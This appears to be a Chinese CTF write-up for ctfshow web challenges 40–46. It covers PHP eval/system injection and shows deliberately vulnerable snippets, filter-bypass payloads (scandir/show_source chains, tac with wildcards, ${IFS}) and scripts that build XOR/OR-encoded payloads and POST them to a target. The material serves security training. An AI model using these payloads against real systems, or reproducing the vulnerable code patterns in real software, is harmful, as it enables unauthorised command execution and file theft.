<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
<p>​		前置知识：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line"><span class="title function_ invoke__">current</span>() ：返回数组中的当前元素的值；默认取第一个值</span><br><span class="line"><span class="title function_ invoke__">pos</span>()：<span class="title function_ invoke__">current</span>() 的别名</span><br><span class="line"><span class="title function_ invoke__">reset</span>() 将 <span class="keyword">array</span> 的内部指针倒回到第一个单元并返回第一个数组单元的值。</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()：数组逆序</span><br><span class="line">(如果不是数组的最后一个或者倒数第二个呢？我们可以使用<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>())，<span class="title function_ invoke__">array_flip</span>()是交换数组的键和值，<span class="title function_ invoke__">array_rand</span>()是随机返回一个数组)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()：列出指定路径中的文件和目录</span><br><span class="line"><span class="title function_ invoke__">next</span>()：函数将内部指针向前移动一位即指向数组中的下一个元素，并输出这个元素。</span><br></pre></td></tr></table></figure>
<p>​		或者使用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看当前目录下文件</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)));</span><br><span class="line">找到flag.php</span><br><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">高亮显示即可</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br></pre></td></tr></table></figure>
<h1 id="web41"><a class="markdownIt-Anchor" href="#web41">#</a> Web41：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		无字母数字 RCE，并且因为过滤了 $、+、-、^、~ 所以无法使用异或、自增和取反绕过，不过，听说网上还有另一个操作，就是利用管道符，也就是 | 运算符，这里贴一下相关的文章：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA5MTQzNDEzP29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZibG9nLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5ibG9nfmZpcnN0X3JhbmtfdjJ+cmFua192MjktMS0xMDkxNDM0MTMucGNfdjJfcmFua19ibG9nX2RlZmF1bHQmYW1wO3V0bV90ZXJtPSVFNSU4RiU5NiVFNSU4RiU4RCZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA4NTY5MDgw">ctfshow web 入门 web41</span></p>
<p>​		这里给了两个代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		还有 python 的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
<p>​		另一个，贴一下羽神的脚本，这个感觉更好用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>
<h1 id="web42"><a class="markdownIt-Anchor" href="#web42">#</a> Web42：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		对于这里的，可以参考下下面这篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGlueXdhbi9wLzYwMjU0NjguaHRtbA==">     Shell 脚本 ———— /dev/null 2&gt;&amp;1 详解 </span></p>
<p>​		这里如果只是想要解题的话，可以想办法让后面的不执行，或者前后分离开就行了，这里有如下几种方法：</p>
<blockquote>
<p>; // 分号<br>
 | // 只执行后面那条命令<br>
 || // 只执行前面那条命令<br>
 &amp; // 两条命令都会执行<br>
 &amp;&amp; // 两条命令都会执行</p>
</blockquote>
<h1 id="web43"><a class="markdownIt-Anchor" href="#web43">#</a> Web43：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		对比上一题，多了一层过滤，多了一个 cat 和分号，老样子，同一个 payload：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla* ||</span><br></pre></td></tr></table></figure>
<p>​		再一次，贴一下可以绕过的方式：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=more flag.php||</span><br><span class="line">?c=sort flag.php||</span><br><span class="line">?c=less flag.php||</span><br><span class="line">?c=tac flag.php||</span><br><span class="line">?c=tail flag.php||</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=strings flag.php||</span><br></pre></td></tr></table></figure>
<h1 id="web44"><a class="markdownIt-Anchor" href="#web44">#</a> Web44：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		多过滤了 flag，通配符绕过：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac f* ||</span><br></pre></td></tr></table></figure>
<h1 id="web45"><a class="markdownIt-Anchor" href="#web45">#</a> Web45：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		过滤了空格，老样子，IFS 绕过：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=tac<span class="built_in">$</span>&#123;IFS&#125;fla*||</span><br></pre></td></tr></table></figure>
<h1 id="web46"><a class="markdownIt-Anchor" href="#web46">#</a> Web46：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
